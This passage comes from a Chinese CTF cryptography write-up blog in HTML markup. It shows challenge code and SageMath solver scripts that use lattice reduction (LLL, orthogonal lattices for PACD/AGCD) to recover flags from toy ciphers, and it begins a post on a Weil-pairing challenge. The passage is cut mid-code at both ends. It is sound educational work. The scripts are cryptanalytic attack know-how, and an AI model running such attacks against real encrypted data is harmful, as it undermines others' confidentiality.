class="number">558240645642302963325581107204211662019896908316831899444935081810819489268610165950</span>, <span class="number">1058477746525469710567689847282850794170250650192794892415352733735415750154044535539</span>, <span class="number">1078948952548590509616082107408254715684287170445966544383750373684441181406075608800</span>, <span class="number">1125503915235599245173592373330463888468814720113318696411329986853859005519154551245</span>, <span class="number">620937641933659718470519231175003762666892925875327642171561741417944681106496958467</span>, <span class="number">1606192912497675735832389346699475593863960301930109653069662356606234973780336341534</span>, <span class="number">1080665036256326887412273484626209788664633047255179233142423471463514811554155351816</span>, <span class="number">983009583253660084055702843297933007090244160053834934015802835528599935867335658914</span>, <span class="number">483554778736863191047830758397092863562079726548422384268968936073701177390747179894</span>, <span class="number">1448392838363784830874780455853191313920717249664981009097361707739423512768919183176</span>, <span class="number">1485175804980546607220269493098915446350406205462077528986751407380405658199537322034</span>, <span class="number">645127338301455578293193215328875283422934699182904112612610112081929081505533458304</span>, <span class="number">1809012351380435986646710932772127842855528298763939575266488725018536037784342688529</span>, <span class="number">1204732789391044629328843397205785308919820285525150764490536624969971871178313643864</span>, <span class="number">577072907834194443039001358264806817627199891744275024388326836994220595931009773412</span>, <span class="number">4850110449540994875278068624822977611188629104877448016749725577673217396499782282</span>, <span class="number">1431458221917644050146055837804453915809781510516096707298405324221753990760039183190</span>, <span class="number">997966793625232984798176686099411790420209217223783698909939651134351713786805317998</span>, <span class="number">1663286211430268448119727051818073243067649643181675027323547282932628837598336996456</span>, <span class="number">1864894557154744961308146774304105483911867578158330607820790060568575114233028842003</span>, <span class="number">345822843952211153189889023070066136116424104740167243049994988868945364800740535124</span>, <span class="number">803699468991667968627856232995969437316168483382073633967569490433608395707635458855</span>, <span class="number">1700532832517222239684444041937412551935144886911006116260771516969538181780787023704</span>, <span class="number">351624945474123146509460066647337532150453362002844376810733781394757015795554947704</span>]</span><br><span class="line">enc = <span class="number">463802484547898091835999726502006552543022358314700124374789687370275467670717610329</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">mask_bits = <span class="number">280</span></span><br><span class="line">key=<span class="number">1000001</span></span><br><span class="line">var_names = [<span class="string">&#x27;v&#x27;</span> + <span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建多项式环（32个变量，系数为整数）</span></span><br><span class="line">R = PolynomialRing(ZZ, var_names)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取所有变量（按顺序）</span></span><br><span class="line">variables = R.gens()</span><br><span class="line">x = variables[<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> tqdm(variables):</span><br><span class="line">    x = key * x + c</span><br><span class="line">coe = x.coefficients()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 造格</span></span><br><span class="line">t = (enc ^^ <span class="number">32</span>) &amp; mask</span><br><span class="line">M = identity_matrix(ZZ, <span class="number">32</span> + <span class="number">2</span>)</span><br><span class="line">bel = <span class="number">2</span> ^ <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    M[i, -<span class="number">1</span>] = coe[i] * bel</span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">M[-<span class="number">1</span>, -<span class="number">1</span>] = <span class="number">2</span> ** <span class="number">280</span> * bel</span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">1</span>] = -t * bel</span><br><span class="line">res = M.LLL()[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> i[-<span class="number">2</span>] == <span class="number">1</span>:</span><br><span class="line">        res = i[:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 还原key</span></span><br><span class="line">a1 = invert(key, <span class="number">2</span> ** <span class="number">280</span>)</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[::-<span class="number">1</span>]:</span><br><span class="line">    xa = (t - i) % (<span class="number">2</span> ^ <span class="number">280</span>)</span><br><span class="line">    x = t ^^ xa</span><br><span class="line">    flag += long_to_bytes(x)</span><br><span class="line">    t = (xa * a1) % (<span class="number">2</span> ** <span class="number">280</span>)</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h1 id="4，Noisy"><a href="#4，Noisy" class="headerlink" title="4，Noisy"></a>4，Noisy</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Noisy_cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, params</span>):</span><br><span class="line">        self.nbits = params[<span class="string">&quot;nbits&quot;</span>]</span><br><span class="line">        self.pbits = params[<span class="string">&quot;nbits&quot;</span>]//<span class="number">2</span></span><br><span class="line">        self.Mbits = params[<span class="string">&quot;Mbits&quot;</span>]</span><br><span class="line">        self.k0bits = params[<span class="string">&quot;k0bits&quot;</span>]</span><br><span class="line">        self.k1bits = params[<span class="string">&quot;k1bits&quot;</span>]</span><br><span class="line">        self.samples = params[<span class="string">&quot;samples&quot;</span>]</span><br><span class="line">        self.p = getPrime(self.pbits)</span><br><span class="line">        self.q = getPrime(self.nbits)</span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line">        self.s = randint(<span class="number">0</span>, self.n)</span><br><span class="line">        self.M = getrandbits(self.Mbits)</span><br><span class="line">        self.pubKey = [self.n]</span><br><span class="line">        self.priKey = [self.s, self.p, self.M]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,msg</span>):</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.samples):</span><br><span class="line">            k0 = getrandbits(self.k0bits)</span><br><span class="line">            k1 = getrandbits(self.k1bits)</span><br><span class="line">            ci = self.s * (msg[i] + k0*self.M)*(<span class="number">1</span> + k1*self.p) % self.n</span><br><span class="line">            res.append(ci)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;nbits&quot;</span>:<span class="number">1024</span>,</span><br><span class="line">        <span class="string">&quot;Mbits&quot;</span>:<span class="number">30</span>,</span><br><span class="line">        <span class="string">&quot;k0bits&quot;</span>:<span class="number">30</span>,</span><br><span class="line">        <span class="string">&quot;k1bits&quot;</span>:<span class="number">512</span>,</span><br><span class="line">        <span class="string">&quot;samples&quot;</span>:<span class="number">20</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    mbits = <span class="number">24</span></span><br><span class="line">    Noise = Noisy_cipher(params)</span><br><span class="line">    n = Noise.n</span><br><span class="line">    msg = [getrandbits(mbits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(params[<span class="string">&quot;samples&quot;</span>])]</span><br><span class="line">    cipher = Noise.encrypt(msg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        flag = file.readlines()[<span class="number">0</span>].encode()</span><br><span class="line">    file.close()</span><br><span class="line">    key = md5(<span class="built_in">str</span>(msg).encode()).digest()</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    encrypted_flag = aes.encrypt(pad(flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        file.write(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(cipher) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        file.write(<span class="string">&#x27;encrypted_flag = &quot;&#x27;</span> + encrypted_flag + <span class="string">&#x27;&quot;\n&#x27;</span>)</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure>

<p>大概看一眼题目代码不难发现重点是这一行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ci = self.s * (msg[i] + k0*self.M)*(<span class="number">1</span> + k1*self.p) % self.n</span><br></pre></td></tr></table></figure>

<p>展开改写一下得到</p>
<p>令x&#x3D;m+k$_0$·M.可以写成x+k$_1$x · p mod n，并且我们已知n&#x3D;pq，这就转化成了一个PACD问题，可以使用正交格的方法求解，可以参考<a href="https://tanglee.top/2023/12/12/Orthogonal-Lattice-Attack/">格密码分析：正交格攻击 | tl2cents blog</a>，值得注意的是正交格规约出来是与原向量垂直的向量，所以要求我们想得到的结果需要对造出的格求一个right_kernel()。然后就能得到x，且x&#x3D;m+k$_0$·M，那就是一个AGCD了，也是正交格去打。</p>
<p>那么就可以写出代码啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flatter</span>(<span class="params">M</span>):</span><br><span class="line">    <span class="comment"># compile https://github.com/keeganryan/flatter and put it in $PATH</span></span><br><span class="line">    z = <span class="string">&quot;[[&quot;</span> + <span class="string">&quot;]\n[&quot;</span>.join(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, row)) <span class="keyword">for</span> row <span class="keyword">in</span> M) + <span class="string">&quot;]]&quot;</span></span><br><span class="line">    ret = check_output([<span class="string">&quot;flatter&quot;</span>], <span class="built_in">input</span>=z.encode())</span><br><span class="line">    <span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line">    <span class="keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="built_in">map</span>(<span class="built_in">int</span>, findall(<span class="string">b&quot;-?\\d+&quot;</span>, ret)))</span><br><span class="line"></span><br><span class="line">n = <span class="number">931345196654137409294197135173149859904800504387235031569844050477816805471659477549867345780405716254835453866134323419945309131852465776955243829422305657434938224724478007837188982154686395040152421927773513751675951117273164534599361707388401754689467232293524773873081390900445460751849312463853674644147032417729111218144080786016585938118028106088150701390374246123227343653724932824469200315405886227541178516859510470438102946063729298109789753400535413</span></span><br><span class="line">c = [<span class="number">44393461469135749552341687573367202324883191440583805973792574295302702852134846481849103946409919792057095346990009804033846370311582900685718559323930567746395228471258159648661807580463697803841730176308557755645476991733346247396500365688994367463153020886602899611038036228481769117396526392280614311463280399494133571801648415803508402241721480392296346279553729911935412665319929139397699629742042460689944378768977129239396836317204774266638191562623642</span>, <span class="number">539920802606578584210996520924579291346905910518135607177245745820517711828351507337959361269794979842233434156795677265464942949246448433197513954168602625494100194699716593500051960783605835250817713574311904996510832420400834091420622842541472830357072621740148258698642873008987856098015262213586418636597458173855887200534596678693164065907611865092804827249866719338749882553240206311618656611195747325612206359345586978029288254676405381961327252078121227</span>, <span class="number">912969253027180152302008239757950557255143999987684345824704782128308837709443475359601738962500473197792984510949472765652709449576511551753476192189067928236825729802081544313577905638454269321307806960030818401241547153518148752380077970852835890206560157651154083006318242420498917321741946345422908249723406759064990622534934300768889856495669567881646449061735911544207219295421775183342850849511318455169459802392153404840292256588462238484017184070439058</span>, <span class="number">704129339391476902834623647545050360055052560918471812433439198050896702771009034197961257854439637856923149427107485450685758012059915229254711158222062274633832027255279885472858093979886344455603364752039574393763740089052781056817698204632985382283135005709245118795006715288914374917267774490980643965855806763792705970367942842066301900528153149411886703069237980512017698620265259775250207231454943195707701376131205089963780783194378880892920761769396376</span>, <span class="number">75233039998980230184893215882867932908211138581464925469465529257051933026745951594054393764107823684556757549941976687507867860435869332829256074033281246343192963839759052028459631662209667578023008295444423181997621348563199183346960455353232990885813330466287295547759326363405275137501042528970911270222207659932659495447106007866559948214804837910916964981447827647966841595069719238014777879036315306528393822101416510360429475270780316967314977212062479</span>, <span class="number">461423095526820857155507142909810859741993739691637425310258711373657533005997947691887212668647744754708998545032230990008781169413674049824069040664094391313692719411542897396557436563635856225821281279781008700827315066631377604685721697875513442045633625509355719320731049790871449432502165309335238486557551797017798444889669487248744419599481849250280233778118639348019549912963106101292147155681429237126220845262529135044627852020816746814659384780280973</span>, <span class="number">367364572148059002452458378431919918417128457895918835895792042718588658184890998070524174563741131829770068017761303942083521976211260357518337046963857857923796113599655185025979061513594565985351757490979954268209182516032134979103468620018163916908405334869466018019365868158827852395987531538640537494591839876488794094867513081526454002977847709327257947076683213914991119173347188654815917923371430774772220979039309203396300178280207360538444565566020299</span>, <span class="number">904463452273264226577027020039531313648975201538158946181894446099560257332044693934142997946585244486522386003568254369400502693137880071694551015943027552207478494112177186465294633752846739107117260820777505887557669953162522289988781935162572334120761828958346938610998284198883207252030818244320266796588782628679469599573621141532731189668347726613589688599907757436810708578278511123476853464661969249807190793933642629049121152594554138741064353908267527</span>, <span class="number">905416992071609918194286515398185039717046426602235967032724042039427878441223712019928849846046512156035414203668484273724435007867326197142639578134394106888412651336818885397451910937280467497797130716216468206865920691694792412526665587970431309296769222651386297077280003604436310714741049806737139142445245569932908914027744645513522958423615830744399292707462525246610072828618152626530619477149886211241901531983934546033687698719922827074723162112877139</span>, <span class="number">452643031792027333761138831146502956340724720315042375737589105675038921336234007024472026194106213621694017814735826360779159432111610885222090540082603623837117068711452615521100137223909708233119331357716789686350547309821120723790772118708237069207516678406654282702496219667506339320212014846049065105749599898166761195573717057859137983450296304872572871751663468743347535459305514224218500703387571202207027664726341715849324032699940941905839302766827499</span>, <span class="number">212673278087605343276071433314325651822590138814583835769266435297532085609513722222971062796758536350174937826257599823800561305906518757901728127745886814862639273759236069230910033612691903488587337500974112537248366383295461678533905165374092697347321036155866150099809018499951162533765210416850725766195148466913723342201317273777814265581791043948667692208912085197333559714555752788986641645892112079484237438406289333978097134665465890869117192499040078</span>, <span class="number">618885378867829225574384501430248365944801981788397398087382860821512631127016396693744705104921139258471344898496683075139334050462054819762115919159392842707178868016697534175927650393416588623170936742373077805758963002568768267797843281721972800997172099222722029886235184148160770288591312377965422085410302286242604988405174145979590045724258072059745959840087044435085850665653201438615483013012669624865477331056502564666781619316693156013842919938163321</span>, <span class="number">247541522606162447639301360070006352189819939226525086556447182525813620932850763368793482733250887839896454988833382645818017844366921462117689698250456542373028553792898964827039839763697407818465152532046980456227414222696647288759140238333732153522322593390570208339332394637394873323773760730999003953875961526476008886559596300228049432970064036768172196837050887080432644677813778844185851969703026669069770482802366425198959039311171290582323970136971886</span>, <span class="number">908018178869624877463246006010850998859189967677977854520359272664016848400825720425780329121594793126516838777613620596508996703936445567812415853284383999097120944182957514958755630252556706588567697742822534195073018061427160931816814733075736791598346359735687960831673101184689094229555577585585923791489244865110884570860216605752334625663191443649941759569007973564548438436441428870306894238322372831477776218474307399183417368990004923389659543747195296</span>, <span class="number">366523156922156965821828874107564478788643127754015557590598074555449309032008658382486713007501973690333305257733148972529467963882646318977084677556747090610737208466813471179929722614677159741828176112063648755272191520333104369216677948221832614065957220855992127171151122742679465992969209100579420456272759494150603308918209213782654566120728303606840200883548862818260127217153333990531566636412609141292951607073854516504587688328356290301197508841143741</span>, <span class="number">639406992161231079019948085936226229300789127373562729169611827945671359155688049810884857367876003831554226874585473740231752445953638246901220714046836671336883740086166378134402994243966696885331702926066667688733147620400909589757552630021877907871711728497089853311096298440658356847718920978470275256185444145070691778883308538596800581292775537884030859076294618094092471841198971413069838393993348287099841406516752971246902464209608259286659436366564130</span>, <span class="number">174788516082730477653159546514041816772418089789276014413831566132969570738198961172185399940444613359439932847237594496731166190833395423296555364488106067480663357216325505878919022799798056746312098513235963582560821318135335749507326788293491822146649158662575138071628748364257596420485792422257187406205492351506462873966550421052920225650910969287505948086603766444926390024169074853316825113026820782720738096044454079119560396182767773276067915935620838</span>, <span class="number">692122366621668667934219623781427243412441522160495343734761009370335228032983188772200711284859681304604759206913240934049495316525633233831165309292048163807009060066877565588518825399293683925724650068090938676695109266471854850233584663313868765863440164620682884162805086273022432479339558553205180790661279541212760937139848506839349409774335221610460173306469631751320521446368124215699897055036629272579050909508624189106164372746898653884579369739300732</span>, <span class="number">655458433272866580956847752295203248320777879825112389989922084544791554484471603499617539316146184842569741790211263945397678411830636036184289378485001841639074371604764089931122272819428308907402735409020487920248536050013994567271676166709669489791796881195493234306692941286104370305393726294538393465256528119230161794643693614527801553094915478577302812822235536872500554436063474907280123259938377500419679054323084985978824524145718399076476333347704243</span>, <span class="number">469953808456651804146000233164086224981688489612248280585566256224965907341271421402496612389906809620564044789407968371121708170572023237144917029355521900919148351696528608187440824844352038236393593068104904053288525955999815309158295080405407971397111278262543364815818529357051823886830084476645557683307203866337081517030832639815424599514896405759257146192241829045108758822206019067643000025217245916174241352087766812082643533881822356002925358883319804</span>]</span><br><span class="line">encrypted_flag = <span class="string">&quot;3627c955f73257f3253e1ab1d0d9489da506d71bf670776a005fb44bab85fa2d&quot;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(encrypted_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################### step1 PACD</span></span><br><span class="line">l = <span class="built_in">len</span>(c)</span><br><span class="line">c_vec = vector([(-c[i] * invert(c[-<span class="number">1</span>], n)) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>)])</span><br><span class="line">L = identity_matrix(l - <span class="number">1</span>).augment(c_vec)</span><br><span class="line">L = L.stack(vector([<span class="number">0</span>] * (l - <span class="number">1</span>) + [n]))</span><br><span class="line">u = L.LLL()[:-<span class="number">2</span>]</span><br><span class="line">r = Matrix(u).right_kernel().matrix()[<span class="number">0</span>].<span class="built_in">list</span>()</span><br><span class="line"><span class="comment">#p = GCD(c[1] * r[1] - c[2] * r[0], n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################### step2 GACD</span></span><br><span class="line">l = <span class="built_in">len</span>(r)</span><br><span class="line">alpha = <span class="built_in">int</span>(<span class="number">2</span> ** <span class="number">24</span>)</span><br><span class="line">A = vector(r)</span><br><span class="line">L = identity_matrix(l).augment(Matrix(alpha * A).T)</span><br><span class="line">t = L.LLL()</span><br><span class="line">V = [x[:-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> t[:-<span class="number">2</span>]]</span><br><span class="line">t = Matrix(V).right_kernel().matrix()</span><br><span class="line">r = t.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################### step3 get flag</span></span><br><span class="line">msg = r.<span class="built_in">list</span>()</span><br><span class="line">key = md5(<span class="built_in">str</span>(msg).encode()).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>(不过不知道为什么flatter犯病了，明明其他用flatter的脚本都能跑偏偏这个跑不出，只能改成正常的LLL了qaq)</p>
<p>(还有两道先咕咕)</p>
]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>2025红明谷</title>
    <url>/2025/03/23/2025%E7%BA%A2%E6%98%8E%E8%B0%B7/</url>
    <content><![CDATA[<p>ouo</p>
<p>拼尽全力只能做出来一道，唉还是太菜了</p>
<span id="more"></span>

<h1 id="qaq"><a href="#qaq" class="headerlink" title="qaq"></a>qaq</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">qaq = E.order()//qwq**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag = pad(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(),<span class="number">4</span>)</span><br><span class="line">flag_part = [bytes_to_long(flag[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_part:</span><br><span class="line">    P1 = qaq*E.random_element()</span><br><span class="line">    P2 = qaq*E.random_element()</span><br><span class="line">    out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c</span><br><span class="line">    output.append(<span class="built_in">pow</span>(out,qaq, pp))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>做这道题蛮重要的一点是要知道双线性对的特点</p>
<p><img src="https://ooo.0x0.ooo/2025/03/23/OSLYO1.png" alt="OSLYO1.png"></p>
<p>首先我们知道</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P1 = qaq*E.random_element()</span><br><span class="line">P2 = qaq*E.random_element()</span><br></pre></td></tr></table></figure>

<p>因为计算weil_pairing可以判断P1和P2是否线性相关，即存在k，使P1&#x3D;kP2，那么我们不难得到e(p1,p2)&#x3D;1,即(e(p1,p2)$^{qwq}$)$^3$&#x3D;1 mod pp,所以（(e(p1,p2)$^{qwq}$)$^{3*qaq}$ &#x3D;1 mod p,即pow(pow(int(P1.weil_pairing(P2, qwq)**3), qaq, pp), qwq, p)&#x3D;1。</p>
<p>且有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c，</span><br></pre></td></tr></table></figure>

<p>即有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pow</span>(<span class="built_in">pow</span>(out, qaq, pp), qwq, p)=(<span class="number">1</span>⋅c^qaq)^qwq mod p=c^(qaq⋅qwq)modp=<span class="built_in">pow</span>(c,qaq*qwq,p)</span><br></pre></td></tr></table></figure>

<p>由费马小定理，c$^{qaq⋅qwq mod(p−1)}$≡c $^{qaq⋅qwq}$modp ,我们令d&#x3D;inv(qaq⋅qwq,p−1)，这里因为qaq⋅qwq与p-1有公因数。我们除去公因数后才能求解逆元。</p>
<p>有<em>c</em>≡(out$^{qaq⋅qwq}$)$^d$ mod p.解出c后建立字典进行每两字节的映射还原flag即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span 